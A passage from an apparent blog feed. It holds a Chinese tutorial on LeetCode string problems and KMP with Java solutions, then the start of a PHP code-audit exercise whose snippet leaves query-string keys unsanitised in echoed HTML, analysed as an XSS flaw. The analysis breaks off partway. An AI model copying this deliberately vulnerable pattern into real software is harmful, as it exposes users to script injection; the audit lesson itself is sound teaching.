“leeto”<br>输出：-1<br>解释：”leeto” 没有在 “leetcode” 中出现，所以返回 -1 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 基于窗口滑动的算法</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * 时间复杂度：O(m*n)</span></span><br><span class="line"><span class="comment">     * 空间复杂度：O(1)</span></span><br><span class="line"><span class="comment">     * 注：n为haystack的长度，m为needle的长度</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">strStr</span><span class="params">(String haystack, String needle)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> needle.length();</span><br><span class="line">        <span class="comment">// 当needle是空字符串时我们应当返回0</span></span><br><span class="line">        <span class="keyword">if</span>(m == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> haystack.length();</span><br><span class="line">        <span class="keyword">if</span>(n &lt; m)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; n-m+<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="comment">//找到首字母相等</span></span><br><span class="line">            <span class="keyword">while</span>(i &lt; n &amp;&amp; haystack.charAt(i) != needle.charAt(j))&#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i == n)&#123;</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 遍历后续字符，判断是否相等</span></span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">            <span class="keyword">while</span>(i &lt; n &amp;&amp; j &lt; m &amp;&amp; haystack.charAt(i) == needle.charAt(j))&#123;</span><br><span class="line">                i++;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(j == m)&#123;</span><br><span class="line">                <span class="keyword">return</span> i-j;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                i -= j - <span class="number">1</span>;</span><br><span class="line">                j = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// KMP解法，next数组首位-1的方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getNext</span><span class="params">(<span class="type">int</span>[] next, String s)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        next[<span class="number">0</span>] = j;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; s.length(); i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(j &gt;= <span class="number">0</span> &amp;&amp; s.charAt(i) != s.charAt(j+<span class="number">1</span>))&#123;</span><br><span class="line">                j = next[j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s.charAt(i) == s.charAt(j+<span class="number">1</span>))&#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            next[i] = j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">strStr</span><span class="params">(String haystack, String needle)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(needle.length() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[] next = <span class="keyword">new</span> <span class="title class_">int</span>[needle.length()];</span><br><span class="line">        getNext(next, needle);</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; haystack.length(); i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(j &gt;= <span class="number">0</span> &amp;&amp; haystack.charAt(i) != needle.charAt(j+<span class="number">1</span>))&#123;</span><br><span class="line">                j = next[j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(haystack.charAt(i) == needle.charAt(j+<span class="number">1</span>))&#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(j == needle.length() - <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> (i-needle.length() + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h3><p>这道题其实核心算法是KMP算法,写过KMP的同学，一定都写过next数组，那么这个next数组究竟是个啥呢？next数组就是一个前缀表（prefix table）。<br>前缀表有什么作用呢？前缀表是用来回退的，它记录了模式串与主串(文本串)不匹配的时候，模式串应该从哪里开始重新匹配。<br>为了清楚地了解前缀表的来历，我们来举一个例子：<br>要在文本串：aabaabaafa 中查找是否出现过一个模式串：aabaaf。前缀表是如何记录的呢？<br>首先要知道前缀表的任务是当前位置匹配失败，找到之前已经匹配上的位置，再重新匹配，此也意味着在某个字符失配时，前缀表会告诉你下一步匹配中，模式串应该跳到哪个位置。<br>那么什么是前缀表：记录下标i之前（包括i）的字符串中，有多大长度的相同前缀后缀。</p><p>刚刚匹配的过程在下标5的地方遇到不匹配，模式串是指向f，如图：<br><img src="/2024/10/16/algorithm/string/image-2.png"><br>然后就找到了下标2，指向b，继续匹配：如图：<br><img src="/2024/10/16/algorithm/string/image-3.png"><br>下标5之前这部分的字符串（也就是字符串aabaa）的最长相等的前缀 和 后缀字符串是 子字符串aa ，因为找到了最长相等的前缀和后缀，匹配失败的位置是后缀子串的后面，那么我们找到与其相同的前缀的后面重新匹配就可以了</p><p>如何计算前缀表<br><img src="/2024/10/16/algorithm/string/image-4.png"><br>长度为前1个字符的子串a，最长相同前后缀的长度为0。（注意字符串的前缀是指不包含最后一个字符的所有以第一个字符开头的连续子串；后缀是指不包含第一个字符的所有以最后一个字符结尾的连续子串。）<br><img src="/2024/10/16/algorithm/string/image-5.png"><br>长度为前2个字符的子串aa，最长相同前后缀的长度为1。<br><img src="/2024/10/16/algorithm/string/image-6.png"><br>长度为前3个字符的子串aab，最长相同前后缀的长度为0。<br>以此类推： 长度为前4个字符的子串aaba，最长相同前后缀的长度为1。 长度为前5个字符的子串aabaa，最长相同前后缀的长度为2。 长度为前6个字符的子串aabaaf，最长相同前后缀的长度为0。<br>那么把求得的最长相同前后缀的长度就是对应前缀表的元素，如图：<br><img src="/2024/10/16/algorithm/string/image-7.png"><br>可以看出模式串与前缀表对应位置的数字表示的就是：下标i之前（包括i）的字符串中，有多大长度的相同前缀后缀。</p><p>前缀表与next数组<br>很多KMP算法的实现都是使用next数组来做回退操作，那么next数组与前缀表有什么关系呢？<br>next数组就可以是前缀表，但是很多实现都是把前缀表统一减一（右移一位，初始位置为-1）之后作为next数组。<br>为什么这么做呢，其实这并不涉及到KMP的原理，而是具体实现，next数组既可以就是前缀表，也可以是前缀表统一减一（右移一位，初始位置为-1）。</p><p>时间复杂度分析：其中n为文本串长度，m为模式串长度，因为在匹配的过程中，根据前缀表不断调整匹配的位置，可以看出匹配的过程是O(n)，之前还要单独生成next数组，时间复杂度是O(m)。所以整个KMP算法的时间复杂度是O(n+m)的。</p><h2 id="459-重复的子字符串"><a href="#459-重复的子字符串" class="headerlink" title="459.重复的子字符串"></a>459.重复的子字符串</h2><p>给定一个非空的字符串 s ，检查是否可以通过由它的一个子串重复多次构成。</p><p>示例 1:<br>输入: s &#x3D; “abab”<br>输出: true<br>解释: 可由子串 “ab” 重复两次构成</p><p>示例 2:<br>输入: s &#x3D; “aba”<br>输出: false</p><p>示例 3:<br>输入: s &#x3D; “abcabcabcabc”<br>输出: true<br>解释: 可由子串 “abc” 重复四次构成。 (或子串 “abcabc” 重复两次构成。)</p><h3 id="暴力解法"><a href="#暴力解法" class="headerlink" title="暴力解法"></a>暴力解法</h3><p>暴力的解法， 就是一个for循环获取 子串的终止位置， 然后判断子串是否能重复构成字符串，又嵌套一个for循环，所以是O(n^2)的时间复杂度。<br>有的同学可以想，怎么一个for循环就可以获取子串吗？ 至少得一个for获取子串起始位置，一个for获取子串结束位置吧。<br>其实我们只需要判断，以第一个字母为开始的子串就可以，所以一个for循环获取子串的终止位置就行了。 而且遍历的时候 都不用遍历结束，<strong>只需要遍历到中间位置</strong>，因为子串结束位置大于中间位置的话，一定不能重复组成字符串。</p><h3 id="结合KMP解法"><a href="#结合KMP解法" class="headerlink" title="结合KMP解法"></a>结合KMP解法</h3><p>假设我们有一个字符串 <code>s = &quot;abcabc&quot;</code>，我们想要判断这个字符串是否由一个更短的子串通过重复组成的。</p><ol><li>第一步：理解字符串重复的基本概念<br> 如果字符串 <code>s</code> 由重复的子串组成，比如 <code>s = &quot;abcabc&quot;</code> 可以看作是 <code>&quot;abc&quot;</code> 重复了两次。这就意味着，如果我们对 <code>s</code> 进行一定的操作，应该能够从中发现重复的模式。</li><li>第二步：构造新字符串<br> 为了探索这种可能的重复模式，我们可以尝试将字符串 <code>s</code> 复制并拼接自身，形成一个新的字符串 <code>t = s + s</code>，即 <code>t = &quot;abcabcabcabc&quot;</code>。</li><li>第三步：去除首尾字符<br> 接下来，我们去掉 <code>t</code> 的首尾字符，这样可以防止我们仅仅是在新字符串的开始或结束处找到原始的 <code>s</code>。去掉首尾字符后，<code>t</code> 变成 <code>&quot;bcabcabcab&quot;</code>。</li><li>第四步：搜索原始字符串<br> 现在，如果在处理后的字符串 <code>t</code> 中仍然能找到原始的字符串 <code>s</code>，这表明 <code>s</code> 确实是由重复的子串组成的。在我们的例子中，<code>&quot;abcabc&quot;</code> 确实出现在 <code>&quot;bcabcabcab&quot;</code> 中，从索引 1 到 6。</li><li>第五步：理解KMP算法的应用<br> 在实际的算法实现中，为了提高搜索的效率，可以使用 KMP 算法。KMP 算法通过预计算一个所谓的”部分匹配表”（也称为 next 数组），来优化搜索过程。这个数组帮助算法在不匹配时，跳过无需比较的部分。</li><li>第六步：代码实现和复杂度分析<br> 在代码实现中，这个原理可以简单地通过检查 <code>t.find(s) != std::string::npos</code> 来实现，即检查 <code>s</code> 是否作为子串存在于 <code>t</code> 中。这种方法的时间复杂度通常为 O(n)，空间复杂度为 O(1)。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">repeatedSubstringPattern</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(s.equals(<span class="string">&quot;&quot;</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 原串加个空格，使下标从1开始，这样j从0开始，也不用初始化了</span></span><br><span class="line">        s = <span class="string">&quot; &quot;</span> + s;</span><br><span class="line">        <span class="type">char</span>[] chars = s.toCharArray();</span><br><span class="line">        <span class="type">int</span>[] next = <span class="keyword">new</span> <span class="title class_">int</span>[len + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造next数组，j从0开始，i从2开始</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>, j = <span class="number">0</span>; i &lt;= len; i++)&#123;</span><br><span class="line">            <span class="comment">// 匹配不成功，j回到前一位置next数组对应的值</span></span><br><span class="line">            <span class="keyword">while</span>(j &gt; <span class="number">0</span> &amp;&amp; chars[i] != chars[j+<span class="number">1</span>]) j = next[j];</span><br><span class="line">            <span class="comment">// 匹配成功，j后移</span></span><br><span class="line">            <span class="keyword">if</span>(chars[i] == chars[j + <span class="number">1</span>]) j++;</span><br><span class="line">            <span class="comment">// 更新next数组的值</span></span><br><span class="line">            next[i] = j;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(next[len] &gt; <span class="number">0</span> &amp;&amp; len % (len - next[len]) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="字符串：总结篇"><a href="#字符串：总结篇" class="headerlink" title="字符串：总结篇"></a>字符串：总结篇</h2><h3 id="双指针法"><a href="#双指针法" class="headerlink" title="双指针法"></a>双指针法</h3><p>在344.反转字符串 (opens new window)，我们使用双指针法实现了反转字符串的操作，双指针法在数组，链表和字符串中很常用。<br>接着在字符串：替换空格 (opens new window)，同样还是使用双指针法在时间复杂度O(n)的情况下完成替换空格。<br>其实很多数组填充类的问题，都可以先预先给数组扩容带填充后的大小，然后在从后向前进行操作。<br>那么针对数组删除操作的问题，其实在27. 移除元素 (opens new window)中就已经提到了使用双指针法进行移除操作。<br>同样的道理在151.翻转字符串里的单词 (opens new window)中我们使用O(n)的时间复杂度，完成了删除冗余空格。<br>一些同学会使用for循环里调用库函数erase来移除元素，这其实是O(n^2)的操作，因为erase就是O(n)的操作，所以这也是典型的不知道库函数的时间复杂度，上来就用的案例了。</p><h3 id="反转系列"><a href="#反转系列" class="headerlink" title="反转系列"></a>反转系列</h3><p>在反转上还可以在加一些玩法，其实考察的是对代码的掌控能力。<br>541.反转字符串II (opens new window)中，一些同学可能为了处理逻辑：每隔2k个字符的前k的字符，写了一堆逻辑代码或者再搞一个计数器，来统计2k，再统计前k个字符。<br>其实当需要固定规律一段一段去处理字符串的时候，要想想在在for循环的表达式上做做文章。<br>只要让 i +&#x3D; (2 * k)，i 每次移动 2 * k 就可以了，然后判断是否需要有反转的区间。<br>因为要找的也就是每2 * k 区间的起点，这样写程序会高效很多。<br>在151.翻转字符串里的单词 (opens new window)中要求翻转字符串里的单词，这道题目可以说是综合考察了字符串的多种操作。是考察字符串的好题。<br>这道题目通过 先整体反转再局部反转，实现了反转字符串里的单词。<br>后来发现反转字符串还有一个牛逼的用处，就是达到左旋的效果。<br>在字符串：反转个字符串还有这个用处？ (opens new window)中，我们通过先局部反转再整体反转达到了左旋的效果。</p><h3 id="KMP"><a href="#KMP" class="headerlink" title="KMP"></a>KMP</h3><p>KMP的主要思想是当出现字符串不匹配时，可以知道一部分之前已经匹配的文本内容，可以利用这些信息避免从头再去做匹配了。<br>KMP的精髓所在就是前缀表，在KMP精讲 (opens new window)中提到了，什么是KMP，什么是前缀表，以及为什么要用前缀表。<br>前缀表：起始位置到下标i之前（包括i）的子串中，有多大长度的相同前缀后缀。<br>那么使用KMP可以解决两类经典问题：<br>匹配问题：28. 实现 strStr()(opens new window)<br>重复子串问题：459.重复的子字符串(opens new window)<br>再一次强调了什么是前缀，什么是后缀，什么又是最长相等前后缀。<br>前缀：指不包含最后一个字符的所有以第一个字符开头的连续子串。<br>后缀：指不包含第一个字符的所有以最后一个字符结尾的连续子串。<br>然后针对前缀表到底要不要减一，这其实是不同KMP实现的方式，我们在KMP精讲 (opens new window)中针对之前两个问题，分别给出了两个不同版本的的KMP实现。<br>其中主要理解j&#x3D;next[x]这一步最为关键！</p><h3 id="常见算法思路与实现"><a href="#常见算法思路与实现" class="headerlink" title="常见算法思路与实现"></a>常见算法思路与实现</h3><ol><li><p><strong>字符串反转</strong> (<code>344. 反转字符串</code>)</p><ul><li>使用双指针法来原地反转字符串，这种方法时间复杂度为 O(n)，空间复杂度为 O(1)。</li><li>代码示例:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverseString</span><span class="params">(<span class="type">char</span>[] s)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = s.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">temp</span> <span class="operator">=</span> s[left];</span><br><span class="line">        s[left++] = s[right];</span><br><span class="line">        s[right--] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>局部字符串反转</strong> (<code>541. 反转字符串 II</code>)</p><ul><li>对特定的子串进行反转，可用于加密、文本处理等场景。</li><li>代码示例:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">reverseStr</span><span class="params">(String s, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    <span class="type">char</span>[] a = s.toCharArray();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>; start &lt; a.length; start += <span class="number">2</span> * k) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start, j = Math.min(start + k - <span class="number">1</span>, a.length - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">tmp</span> <span class="operator">=</span> a[i];</span><br><span class="line">            a[i++] = a[j];</span><br><span class="line">            a[j--] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>字符串中的单词翻转</strong> (<code>151. 翻转字符串里的单词</code>)</p><ul><li>先移除多余空格，再整体反转字符串，最后反转每个单词。</li><li>代码示例:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">    s = s.trim(); <span class="comment">// 去掉首尾空格</span></span><br><span class="line">    String[] words = s.split(<span class="string">&quot;\\s+&quot;</span>); <span class="comment">// 正则匹配连续空格</span></span><br><span class="line">    Collections.reverse(Arrays.asList(words));</span><br><span class="line">    <span class="keyword">return</span> String.join(<span class="string">&quot; &quot;</span>, words);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>KMP算法</strong> (<code>28. 实现 strStr()</code>)</p><ul><li>KMP 是用于字符串搜索的高效算法，通过计算“部分匹配”表来减少比较次数。</li><li>代码示例:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">strStr</span><span class="params">(String haystack, String needle)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (needle.isEmpty()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>[] lps = computeLPSArray(needle);</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; haystack.length()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (haystack.charAt(i) == needle.charAt(j)) &#123;</span><br><span class="line">            i++; j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (j == needle.length()) &#123;</span><br><span class="line">            <span class="keyword">return</span> i - j;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i &lt; haystack.length() &amp;&amp; haystack.charAt(i) != needle.charAt(j)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j != <span class="number">0</span>) j = lps[j - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">else</span> i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>替换数字为字符串</strong> (<code>自定义题目</code>)</p><ul><li>针对字符串中的数字字符进行特定字符串的替换。</li><li>代码示例:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">replaceDigits</span><span class="params">(String s)</span> &#123;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> c : s.toCharArray()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Character.isDigit(c)) sb.append(<span class="string">&quot;number&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> sb.append(c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【代码审计】PHP代码审计4</title>
      <link href="/2024/10/15/WebSecurity/codeaudit/phpaudit4/"/>
      <url>/2024/10/15/WebSecurity/codeaudit/phpaudit4/</url>
      
        <content type="html"><![CDATA[<h2 id="Day-12-String-Lights"><a href="#Day-12-String-Lights" class="headerlink" title="Day 12 - String Lights"></a>Day 12 - String Lights</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sanitized</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$sanitized</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$queryParts</span> = <span class="title function_ invoke__">array_map</span>(function (<span class="variable">$key</span>, <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$key</span> . <span class="string">&#x27;=&#x27;</span> . <span class="variable">$value</span>;</span><br><span class="line">&#125;, <span class="title function_ invoke__">array_keys</span>(<span class="variable">$sanitized</span>), <span class="title function_ invoke__">array_values</span>(<span class="variable">$sanitized</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&amp;&#x27;</span>, <span class="variable">$queryParts</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;/images/size.php?&quot;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$query</span>) . <span class="string">&quot;&#x27;&gt;link&lt;/a&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p><strong>漏洞解析</strong> ：<br>根据题目意思，这里考察的应该是个 <strong>xss漏洞</strong> ， 漏洞触发点应该在代码中的 <strong>第13-14行</strong> 。这两行代码的作用是直接输出一个html的 <code>&lt;a&gt;</code> 标签。代码中的 <strong>第3-5行</strong> ，<strong>foreach循环</strong> 对 <strong>$_GET</strong> 传入的参数进行了处理，但是这里有个问题。我们看下 <strong>第四行</strong> 的代码，这行代码针对 <strong>$value</strong> 进行类型转换，强制变成int类型。但是这部分代码只处理了 <strong>$value</strong> 变量，没针对 <strong>$key</strong> 变量进行处理。经过了 <strong>第3-5行</strong> 的代码处理之后，根据 <strong>&amp;</strong> 这个符号进行分割，然后拼接到 <strong>第13行</strong> 的 <strong>echo</strong> 语句中，在输出的时候又进行了一次 <strong>htmlentities</strong> 函数处理。 <strong>htmlentities</strong> 函数主要是会对一些特殊符号进行HTML实体编码。具体定义如下：</p><blockquote><p><a href="http://php.net/manual/zh/function.htmlentities.php">htmlentities</a> — 将字符转换为 HTML 转义字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">htmlentities</span> ( <span class="keyword">string</span> <span class="variable">$string</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = ENT_COMPAT | ENT_HTML401 [, <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;default_charset&quot;</span>) [, <span class="keyword">bool</span> <span class="variable">$double_encode</span> = <span class="literal">true</span> ]]] )</span><br></pre></td></tr></table></figure><p>作用：在写PHP代码时，不能在字符串中直接写实体字符，PHP提供了一个将HTML特殊字符转换成实体字符的函数 